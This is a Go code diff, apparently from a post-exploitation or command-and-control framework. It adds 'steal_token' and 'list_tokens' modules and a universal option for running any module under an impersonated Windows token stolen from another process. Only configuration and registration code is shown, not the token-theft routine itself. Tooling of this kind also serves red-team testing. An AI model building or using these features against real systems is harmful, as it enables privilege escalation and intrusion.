@@ -9,6 +9,15 @@ const (
 	ModListener     = "listener"
 	ModSSHHarvester = "ssh_harvester"
 	ModDownloader   = "file_downloader"
+
+	// ModStealToken steals an access token from a running process on Windows.
+	// The stolen token is cached in the agent's priv.TokenMap under its SID
+	// and can then be referenced by the universal "token" module option.
+	ModStealToken = "steal_token"
+
+	// ModListTokens lists all tokens currently cached in the agent's priv.TokenMap,
+	// displaying each entry as "DOMAIN\User (SID)" for easy reference.
+	ModListTokens = "list_tokens"
 )
 
 // ModOption represents a module parameter.
@@ -101,6 +110,9 @@ type ResolvedInvocation struct {
 	Stdin          string                  `cbor:"2,keyasint"`
 	TimeoutSeconds int                     `cbor:"3,keyasint"`
 	Coff           *ResolvedCoffInvocation `cbor:"4,keyasint"`
+	// Token is the SID string key into priv.TokenMap for token impersonation.
+	// When non-empty on Windows, module execution runs under that token context.
+	Token string `cbor:"5,keyasint"`
 }
 
 // ResolvedCoffInvocation contains packed COFF args with concrete values
@@ -296,7 +308,74 @@ func populateModules() {
 		},
 	}
 
+	// steal_token – Windows built-in to steal a process token and cache it
+	builtIn[ModStealToken] = &ModuleConfig{
+		Name:     ModStealToken,
+		Build:    "",
+		Date:     "2026-08-09",
+		Comment:  "Steal a Windows access token from a running process and cache it for impersonation",
+		IsLocal:  false,
+		Platform: "Windows",
+		Path:     "",
+		Fileless: true,
+		Options: ModOptions{
+			"pid": &ModOption{
+				Name:     "pid",
+				Desc:     "PID of the process to steal the token from",
+				Val:      "",
+				Type:     "uint",
+				Required: true,
+			},
+		},
+		AgentConfig: AgentModuleConfig{
+			Exec:          "built-in",
+			Files:         []string{},
+			InMemory:      false,
+			Type:          "go",
+			IsInteractive: false,
+		},
+	}
+
+	// list_tokens – Windows built-in to list all cached impersonation tokens
+	builtIn[ModListTokens] = &ModuleConfig{
+		Name:     ModListTokens,
+		Build:    "",
+		Date:     "2026-08-09",
+		Comment:  "List all Windows access tokens currently cached in the agent's token store (DOMAIN\\User + SID)",
+		IsLocal:  false,
+		Platform: "Windows",
+		Path:     "",
+		Fileless: true,
+		Options:  ModOptions{},
+		AgentConfig: AgentModuleConfig{
+			Exec:          "built-in",
+			Files:         []string{},
+			InMemory:      false,
+			Type:          "go",
+			IsInteractive: false,
+		},
+	}
+
 	for k, v := range builtIn {
+		InjectTokenOption(v)
 		Modules.Store(k, v)
+	}
+}
+
+// InjectTokenOption adds the universal "token" option to a module's Options map
+// if it is not already present. This allows operators to set a Windows SID so
+// that module execution runs under that impersonation token.
+func InjectTokenOption(mod *ModuleConfig) {
+	if mod.Options == nil {
+		mod.Options = make(ModOptions)
+	}
+	if _, exists := mod.Options["token"]; exists {
+		return
+	}
+	mod.Options["token"] = &ModOption{
+		Name: "token",
+		Desc: "(Windows) SID of a stolen token to impersonate when running this module; leave empty to run as the current user",
+		Val:  "",
+		Type: "string",
 	}
 }
